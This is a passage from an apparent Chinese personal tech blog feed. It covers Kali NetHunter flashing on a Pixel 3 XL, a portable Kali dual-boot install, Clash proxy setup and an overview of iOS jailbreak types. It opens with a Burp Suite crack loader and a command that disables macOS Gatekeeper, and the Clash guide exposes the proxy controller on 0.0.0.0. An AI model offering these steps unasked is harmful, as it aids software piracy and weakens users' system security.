<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">-javaagent:burploader.jar</span><br><span class="line">-noverify</span><br></pre></td></tr></table></figure></div>

<p>之后就可以正常打开了</p>
<p>P.S.<br>关于mac更新时遇到的那些操作<br>安装新版本前务必删除全部相关文件  </p>
<p>苹果的安全机制，修改包内容后会遇到文件损坏的报错<br>这个时候直接</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo spctl --master-disable</span><br></pre></td></tr></table></figure></div>


<p>就完事了  </p>
]]></content>
  </entry>
  <entry>
    <title>简单记录pixel 3XL刷KaliNetHunter的过程</title>
    <url>/2023/04/23/%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95pixel-3XL%E5%88%B7KaliNetHunter%E7%9A%84%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="首先"><a href="#首先" class="headerlink" title="首先"></a>首先</h2><p>根据kali官方介绍，目前已有大佬开发出相应的kernel用来支持kalinethunter的安装<br><a class="link"   href="https://nethunter.kali.org/kernels.html" >https://nethunter.kali.org/kernels.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/pixel_kali/Pasted image 20230327192859.1x5kw9e5q1gg.webp"
                      alt="Pasted image 20230327192859" 
                ><figcaption>Pasted image 20230327192859</figcaption></figure></p>
<p>我的pixel3XL刚好就在这里<br>那就好办了，<br>看看环境需求：<br>刷原生Android12，刷大佬的kernel<br>看看大佬的介绍页怎么写的：<br><a class="link"   href="https://forum.xda-developers.com/t/kernel-nethunter-for-pixel-3-and-pixel-3-xl-blueline-crosshatch.4456799/" >https://forum.xda-developers.com/t/kernel-nethunter-for-pixel-3-and-pixel-3-xl-blueline-crosshatch.4456799/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/pixel_kali/Pasted image 20230327193057.2i6h1bvt4zs0.webp"
                      alt="Pasted image 20230327193057" 
                ><figcaption>Pasted image 20230327193057</figcaption></figure></p>
<p>需要先用twrp把他的kernel相关文件刷进去<br>然后安装busybox<br>安装Wireless_firmware.zip<br>安装nethunter相关软件<br>升级<br>重启</p>
<p>再看看大佬的gayhub<br><a class="link"   href="https://github.com/V3rB0se/Alynx-Nethunter" >https://github.com/V3rB0se/Alynx-Nethunter <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/pixel_kali/Pasted image 20230327194001.5295ygwtwsw0.webp"
                      alt="Pasted image 20230327194001" 
                ><figcaption>Pasted image 20230327194001</figcaption></figure></p>
<p>那就好办了，需要的文件都提供了，开搞！</p>
<p>twrp的安装本身是个问题，因为官方也说了，安不进去，需要了刷两遍，前提是刷进第三方系统<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/pixel_kali/Pasted image 20230327192630.4u3n6zytawa0.webp"
                      alt="Pasted image 20230327192630" 
                ><figcaption>Pasted image 20230327192630</figcaption></figure></p>
<p>那我就用lineageos先搞一下，避免之后不能root</p>
<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h3 id="刷第三方系统"><a href="#刷第三方系统" class="headerlink" title="刷第三方系统"></a>刷第三方系统</h3><p>根据LineageOS安装引导，<br>下载对应版本的img和zip，准备导入</p>
<p>重启至bootloader</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb reboot bootloader</span><br></pre></td></tr></table></figure></div>

<p>刷镜像进去</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastboot flash boot &lt;name&gt;.img</span><br></pre></td></tr></table></figure></div>

<p>然后重启到Recovery Mod<br>点击Factory Reset，再Format data &#x2F; factory reset，恢复出厂设置，格式化数据<br>回到主菜单，找 Apply from ADB</p>
<p>然后侧载文件</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb sideload &lt;name&gt;.zip</span><br></pre></td></tr></table></figure></div>
<p>侧载结束，第三方系统安装完毕，准备安装twrp</p>
<h3 id="刷twrp"><a href="#刷twrp" class="headerlink" title="刷twrp"></a>刷twrp</h3><p>twrp的安装稍微又些棘手，不过可以借用lineageOS的boot来解决。<br>同样是使用侧载功能</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb sideload twrp.img</span><br></pre></td></tr></table></figure></div>
<p>这样安装的twrp是可以使用的，但会覆盖掉lineageOS的分区，此时就要注意<br>twrp侧载安装会覆盖a、b两个分区，所以之后又要用LineageOS的img再刷一次，以保证系统的正常启动。</p>
<p>twrp侧载之后，使用adb，将后续需要安装的包一股脑全都放进去</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb push &lt;要导入的包&gt; /path</span><br></pre></td></tr></table></figure></div>
<p>这里包括Alynx-12-nethunter-bluecross.zip、Wireless_firmware.zip、Magisk-v25.2.apk</p>
<p>由于twrp已经覆盖了a、b两个区，后续启动是个问题，用fastboot再次覆盖安装lineageOS<br>就可以引导启动系统，并开始Magisk的操作</p>
<p>启动Magick app，修复引导镜像，<br>使用adb把镜像拉到pc上，</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb pull &lt;magick-什么玩应来着&gt;.img</span><br></pre></td></tr></table></figure></div>
<p>使用fastboot，把这个镜像安装到recovery区</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastboot flash recovery &lt;magick-什么玩应来着&gt;.img</span><br></pre></td></tr></table></figure></div>

<p>再次启动系统，应该就能root了</p>
<p>然后再看F-Droid这个app，进入后安装nethunter store<br>后面的懒得教了，一看就知道<br>大不了全装了</p>
]]></content>
  </entry>
  <entry>
    <title>由智能家居入门物联网安全</title>
    <url>/2023/04/23/%E7%94%B1%E6%99%BA%E8%83%BD%E5%AE%B6%E5%B1%85%E5%85%A5%E9%97%A8%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>关于Win+Linux双系统 我实现了一个解决方案</title>
    <url>/2023/04/23/%E5%85%B3%E4%BA%8EWin-Linux%E5%8F%8C%E7%B3%BB%E7%BB%9F-%E6%88%91%E5%AE%9E%E7%8E%B0%E4%BA%86%E4%B8%80%E4%B8%AA%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<blockquote>
<p>前情提要：<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/win_lin/image 1.dc4kno2gir4.webp"
                      alt="image 1" 
                ><figcaption>image 1</figcaption></figure></p>
</blockquote>
<blockquote>
<p>之前完成了便携的kali系统，即，将kali安装在移动硬盘中，想要使用的话，只需要插上后重启即可。<br>某一天发现启动出问题了，故该文章重新编写，把截图全都补上。</p>
</blockquote>
<p>那么，正文开始</p>
<h1 id="买"><a href="#买" class="headerlink" title="买"></a>买</h1><p>这里我们期待的一个环境，就是将linux系统安装在移动硬盘里，做到即插即用。<br>先买一个差不多大的硬盘，这里建议买带硬盘盒的，窄长一小条，方便携带。</p>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/win_lin/image-1668069178564.hjd8m970em0.webp"
                      alt="image-1668069178564" 
                ><figcaption>image-1668069178564</figcaption></figure>

<p>之后选一个差不多的U盘作为安装启动盘，这里用不着买太大的，差不多就行。</p>
<h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p>我们需要一个能将镜像文件存放的安装介质，即把iso放进u盘的工具</p>
<p>Rufus:<a class="link"   href="https://github.com/pbatard/rufus/releases/tag/v3.20" >https://github.com/pbatard/rufus/releases/tag/v3.20 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/win_lin/Snipaste_2022-11-10_10-47-56.43r8lqttadq0.webp"
                      alt="Snipaste_2022-11-10_10-47-56" 
                ><figcaption>Snipaste_2022-11-10_10-47-56</figcaption></figure>

<p>同时linux版本上我们选择kali，当然不同的linux版本的流程基本一致，安装ubuntu等也是一样的流程</p>
<p>kali下载地址：<a class="link"   href="https://www.kali.org/get-kali/#kali-installer-images" >https://www.kali.org/get-kali/#kali-installer-images <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>  </p>
<p>务必注意一下安装平台，我的目标是安装在64位实体机器上的linux系统<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/win_lin/Snipaste_2022-11-10_13-28-10.6en6v2vu5rk0.webp"
                      alt="Snipaste_2022-11-10_13-28-10" 
                ><figcaption>Snipaste_2022-11-10_13-28-10</figcaption></figure></p>
<p>至于installer和Netinstall的区别，一个是镜像文件里包含一定量的系统文件和工具，另一个是啥都没有，需要联网安装，至于weekly，那就是刚刚更新的版本，everything就是全部的工具都有。<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/win_lin/Snipaste_2022-11-10_13-28-45-1668067257514.3yt48fjz8we0.webp"
                      alt="Snipaste_2022-11-10_13-28-45-1668067257514" 
                ><figcaption>Snipaste_2022-11-10_13-28-45-1668067257514</figcaption></figure></p>
<h1 id="刷镜像"><a href="#刷镜像" class="headerlink" title="刷镜像"></a>刷镜像</h1><p>启动rufus，插入U盘，选择镜像，要注意的是，要将一整个U盘都作为使用空间去刷。<br>其余的设置照我这张图来的就行。<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/win_lin/Snipaste_2022-11-10_13-29-42.1jo5i61xa9sw.webp"
                      alt="Snipaste_2022-11-10_13-29-42" 
                ><figcaption>Snipaste_2022-11-10_13-29-42</figcaption></figure><br>接下来要注意的是以什么镜像模式写入，虽然这里建议的是使用ISO模式，但在kali安装的过程中很容易出现找不到介质的问题，故使用DD模式。  </p>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/win_lin/Snipaste_2022-11-10_13-30-03.45p5cdsspy40.webp"
                      alt="Snipaste_2022-11-10_13-30-03" 
                ><figcaption>Snipaste_2022-11-10_13-30-03</figcaption></figure>

<p>接下来等镜像刷好，直接重启</p>
<h1 id="改Bios"><a href="#改Bios" class="headerlink" title="改Bios"></a>改Bios</h1><p>电脑重启后，进入bios，需要改几个设置，security中的secure boot，改成我这个样子<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/win_lin/Snipaste_2022-11-10_16-17-17.13o4zh26iwyk.webp"
                      alt="Snipaste_2022-11-10_16-17-17" 
                ><figcaption>Snipaste_2022-11-10_16-17-17</figcaption></figure></p>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/win_lin/Snipaste_2022-11-10_16-17-31.6nzjkm8p3hs0.webp"
                      alt="Snipaste_2022-11-10_16-17-31" 
                ><figcaption>Snipaste_2022-11-10_16-17-31</figcaption></figure>
然后是startup中，允许legacy boot启动，具体按我这个来就可以，要注意的是，这种启动方式会导致，  
以后只要接入kali系统盘的情况下，直接使用kali的引导进入系统。  
且windows系统进入会略慢。

<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/win_lin/Snipaste_2022-11-10_16-17-41.2opi8uhza9k0.webp"
                      alt="Snipaste_2022-11-10_16-17-41" 
                ><figcaption>Snipaste_2022-11-10_16-17-41</figcaption></figure>
启动顺序，我这里无脑将USB启动的都放在了前面。  
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/win_lin/Snipaste_2022-11-10_16-17-02.23snfrepzejk.webp"
                      alt="Snipaste_2022-11-10_16-17-02" 
                ><figcaption>Snipaste_2022-11-10_16-17-02</figcaption></figure>
保存并退出，引导至kali启动盘界面
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/win_lin/Snipaste_2022-11-10_16-16-38.6fmfv86has00.webp"
                      alt="Snipaste_2022-11-10_16-16-38" 
                ><figcaption>Snipaste_2022-11-10_16-16-38</figcaption></figure>

<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>之后的安装流程与虚拟机的安装基本大同小异，故后面的截图都用的虚拟机作为演示<br>同时我仅将需要注意的部分截图。<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/win_lin/Snipaste_2022-11-10_14-18-50.2hgrvafomha0.webp"
                      alt="Snipaste_2022-11-10_14-18-50" 
                ><figcaption>Snipaste_2022-11-10_14-18-50</figcaption></figure><br>就是这里，如果安装介质的探测失败，就需要回到刷镜像的流程，使用另一种模式重新刷<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/win_lin/Snipaste_2022-11-10_14-19-31.31d01p49h9u0.webp"
                      alt="Snipaste_2022-11-10_14-19-31" 
                ><figcaption>Snipaste_2022-11-10_14-19-31</figcaption></figure><br>之后这里的对磁盘进行分区，使用向导对整个硬盘配置LVM，或者加密LVM，当然也可以手动分配，这样的目的是给之后的GRUB预留空间。</p>
<p>这里要注意的是，不要用掉全部的空间，如果你使用的硬盘是100G，就一定要留出至少1个G出来，<br>比如这个硬盘是321G（这是在虚拟机里识别出来的虚拟硬盘大小），我就大约会流出21G空闲。<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_14-21-20.png"
                      alt="Snipaste_2022-11-10_14-21-20"
                ><figcaption>Snipaste_2022-11-10_14-21-20</figcaption></figure></p>
<p>建议将各个部分都分区，而不是都放在同一个分区里。</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_14-22-49.png"
                      alt="Snipaste_2022-11-10_14-22-49"
                ><figcaption>Snipaste_2022-11-10_14-22-49</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_14-22-35.png"
                      alt="Snipaste_2022-11-10_14-22-35"
                ><figcaption>Snipaste_2022-11-10_14-22-35</figcaption></figure></p>
<p>假如没有分配空闲出来，安装后的效果就会是左上角一直闪烁光标的黑屏，无限黑屏下去。<br>原因是：后面安装GRUB给覆盖了。</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_15-12-49.png"
                      alt="Snipaste_2022-11-10_15-12-49"
                ><figcaption>Snipaste_2022-11-10_15-12-49</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_14-23-27.png"
                      alt="Snipaste_2022-11-10_14-23-27"
                ><figcaption>Snipaste_2022-11-10_14-23-27</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_14-23-40.png"
                      alt="Snipaste_2022-11-10_14-23-40"
                ><figcaption>Snipaste_2022-11-10_14-23-40</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_14-26-16.png"
                      alt="Snipaste_2022-11-10_14-26-16"
                ><figcaption>Snipaste_2022-11-10_14-26-16</figcaption></figure></p>
<p>如果是在已经装了win的电脑上安装kali，这一页会说，这台计算机里还有个windows，要不要把GRUB安装在windows那个驱动器上</p>
<p>我的回答是，否</p>
<p>一定是把GRUB装在我刚刚留出来的空间的，不然以windows动不动就更新的尿性，GRUB会懵比。</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_14-45-12.png"
                      alt="Snipaste_2022-11-10_14-45-12"
                ><figcaption>Snipaste_2022-11-10_14-45-12</figcaption></figure></p>
<p>选择你买的那个移动硬盘。会自动安装在硬盘分区。</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_14-45-27.png"
                      alt="Snipaste_2022-11-10_14-45-27"
                ><figcaption>Snipaste_2022-11-10_14-45-27</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_14-45-41.png"
                      alt="Snipaste_2022-11-10_14-45-41"
                ><figcaption>Snipaste_2022-11-10_14-45-41</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_15-12-12.png"
                      alt="Snipaste_2022-11-10_15-12-12"
                ><figcaption>Snipaste_2022-11-10_15-12-12</figcaption></figure></p>
<p>安装结束，拔下U盘，留下硬盘，直接重新启动，静静等待kali启动的过程。</p>
<h1 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h1><p>效果就是，我整篇流程都是在这个kali上写下的，很舒服<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/win_lin/Screenshot_2022-11-10_21_17_08-1668086282838.6ovjlov1dco0.webp"
                      alt="Screenshot_2022-11-10_21_17_08-1668086282838" 
                ><figcaption>Screenshot_2022-11-10_21_17_08-1668086282838</figcaption></figure></p>
]]></content>
  </entry>
  <entry>
    <title>kali安装clash</title>
    <url>/2023/04/23/kali%E5%AE%89%E8%A3%85clash/</url>
    <content><![CDATA[<blockquote>
<p>直接解决掉kali科学上网的全部</p>
</blockquote>
<h2 id="下载clash"><a href="#下载clash" class="headerlink" title="下载clash"></a>下载clash</h2><p>clash：<a class="link"   href="https://github.com/Dreamacro/clash/releases" >https://github.com/Dreamacro/clash/releases <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>下载后安装并修改权限</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x clash</span><br></pre></td></tr></table></figure></div>



<p>先启动一下clash，让clash自动下载和生成必需文件</p>
<p>配置文件：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/.config/clash</span><br></pre></td></tr></table></figure></div>



<p>删除配置文件：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf config.yaml</span><br></pre></td></tr></table></figure></div>



<p>下载配置文件：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">wget  [链接]</span><br></pre></td></tr></table></figure></div>



<p>从机场下载yaml文件</p>
<p>并放在&#x2F;root&#x2F;.config&#x2F;clash目录下<br>clash的配置文件在~&#x2F;.config&#x2F;clash&#x2F;config.yaml  </p>
<p>修改外部控制设置（external-controller）地址为：0.0.0.0:9890，使内外网都可以访问这个地址</p>
<p>clash图像化配置地址：<a class="link"   href="http://clash.razord.top/" >http://clash.razord.top/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="设置系统代理"><a href="#设置系统代理" class="headerlink" title="设置系统代理"></a>设置系统代理</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/environment</span><br></pre></td></tr></table></figure></div>



<p>填写：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=<span class="string">&quot;http://127.0.0.1:7890&quot;</span></span><br><span class="line"><span class="built_in">export</span> https_proxy=<span class="string">&quot;http://127.0.0.1:7890&quot;</span></span><br><span class="line"><span class="built_in">export</span> no_proxy=<span class="string">&quot;localhost, 127.0.0.1&quot;</span></span><br></pre></td></tr></table></figure></div>



<p>修改sudo文件</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/sudoers</span><br></pre></td></tr></table></figure></div>



<p>在文件中填入</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Defaults env_keep+=<span class="string">&quot;http_proxy https_proxy no_proxy&quot;</span></span><br></pre></td></tr></table></figure></div>



<p>重启</p>
<h2 id="设置开机启动"><a href="#设置开机启动" class="headerlink" title="设置开机启动"></a>设置开机启动</h2><p>将配置文件移动到etc</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> ~/.config/clash /etc</span><br></pre></td></tr></table></figure></div>



<p>添加启动信息</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/systemd/system/clash.service</span><br></pre></td></tr></table></figure></div>



<p>填入</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=clash daemon</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">User=root</span><br><span class="line">ExecStart=/opt/clash/clash -d /etc/clash/</span><br><span class="line">Restart=on-failure</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure></div>



<p>这里要注意配置文件的路径<br>即第7行的内容，clash -d 是指定配置文件的路径</p>
<p>重新加载systemctl daemon</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure></div>



<p>启动clash</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start clash.service</span><br></pre></td></tr></table></figure></div>

<p>Bash</p>
<p>设置开机启动clash</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> clash.service</span><br></pre></td></tr></table></figure></div>



<p>重启clash</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart clash.service</span><br></pre></td></tr></table></figure></div>



<p>查看clash运行状态</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl status clash.service</span><br></pre></td></tr></table></figure></div>

<p>Bash</p>
<h2 id="定期更新订阅"><a href="#定期更新订阅" class="headerlink" title="定期更新订阅"></a>定期更新订阅</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置clash路径</span></span><br><span class="line">clash_path=<span class="string">&quot;/opt/clash&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止clash</span></span><br><span class="line">systemctl stop clash.service</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取消代理</span></span><br><span class="line"><span class="built_in">unset</span> https_proxy</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果配置文件存在，备份后下载，如果不存在，直接下载</span></span><br><span class="line"><span class="keyword">if</span> [ -e <span class="variable">$clash_path</span>/config.yaml ]; <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">mv</span> <span class="variable">$clash_path</span>/config.yaml <span class="variable">$clash_path</span>/configbackup.yaml</span><br><span class="line">	wget -O <span class="variable">$clash_path</span>/config.yaml <span class="string">&quot;[你的订阅链接]&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	wget -O <span class="variable">$clash_path</span>/config.yaml <span class="string">&quot;[你的订阅链接]&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启clash</span></span><br><span class="line">systemctl restart clash.service</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重设代理</span></span><br><span class="line"><span class="built_in">export</span> https_proxy=<span class="string">&quot;http://127.0.0.1:7890&quot;</span></span><br></pre></td></tr></table></figure></div>



<p>设置定时任务：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure></div>


<p>填写：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">30 4 1,15 * * sh [脚本目录]/[脚本名称]</span><br></pre></td></tr></table></figure></div>



<p>重启crontab</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart cron.service</span><br></pre></td></tr></table></figure></div>



<p>搞定！</p>
]]></content>
  </entry>
  <entry>
    <title>苹果端的越狱到frida hook</title>
    <url>/2023/04/23/%E8%8B%B9%E6%9E%9C%E7%AB%AF%E7%9A%84%E8%B6%8A%E7%8B%B1%E5%88%B0frida-hook/</url>
    <content><![CDATA[<h2 id="What-are-the-different-types"><a href="#What-are-the-different-types" class="headerlink" title="What are the different types?"></a>What are the different types?</h2><ul>
<li>Fully Untethered</li>
<li>Semi-Untethered</li>
<li>Semi-Tethered</li>
<li>Tethered</li>
</ul>
<h3 id="Untethered-Jailbreaks"><a href="#Untethered-Jailbreaks" class="headerlink" title="Untethered Jailbreaks"></a>Untethered Jailbreaks</h3><hr>
<p>Untethered jailbreaks can be considered the holy grail of all jailbreaks. They only require the exploit to be ran once either via a website, an app or a computer.</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://ios.cfw.guide/assets/images/p0sixpwn.png"
                      alt="A screenshot of the p0sixspwn jailbreak"
                ><figcaption>A screenshot of the p0sixspwn jailbreak</figcaption></figure></p>
<p>After that, your device is fully jailbroken and won’t require any further action. The exploit will stay on a device even after you reboot it.</p>
<p>Unfortunately, there hasn’t been a new untethered jailbreak in a very long time, and it’s likely we won’t see one for even longer.</p>
<p>The only downside to an untethered jailbreak is that if something goes wrong, it could very well result in a bootloop requiring you to restore your device via iTunes or Finder (macOS Catalina or newer). The likelihood of this happening is <em>low</em>, but is indeed possible.</p>
<p>A few examples of untethered jailbreaks are <a class="link"   href="https://ios.cfw.guide/installing-p0sixspwn" >p0sixspwn <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and Pangu9.</p>
<h3 id="Semi-Untethered-Jailbreaks"><a href="#Semi-Untethered-Jailbreaks" class="headerlink" title="#Semi-Untethered Jailbreaks"></a><a class="link"   href="https://ios.cfw.guide/installing-palera1n/#semi-untethered-jailbreaks" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>Semi-Untethered Jailbreaks</h3><hr>
<p>Semi-untethered jailbreaks have been the most popular type of jailbreak in recent years. This type of jailbreak requires an exploit to be executed every time you reboot or turn off your device.</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://ios.cfw.guide/assets/images/odysseymain.png"
                      alt="A screenshot of the Odyssey jailbreak"
                ><figcaption>A screenshot of the Odyssey jailbreak</figcaption></figure></p>
<p>This jailbreak works by running the exploit through an app on the device itself. The app, however, must be resigned every 7 days if sideloaded with a standard Apple ID. Utilities like AltStore, ReProvision Reborn, and AltDaemon make this process far easier.</p>
<p>Due to the nature of how the exploit is applied, these jailbreaks are easily removable through their respective app.</p>
<p>A few examples of semi-untethered jailbreaks include <a class="link"   href="https://ios.cfw.guide/installing-taurine" >Taurine <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, <a class="link"   href="https://ios.cfw.guide/installing-unc0ver" >unc0ver <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, and <a class="link"   href="https://ios.cfw.guide/installing-odyssey" >Odyssey <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
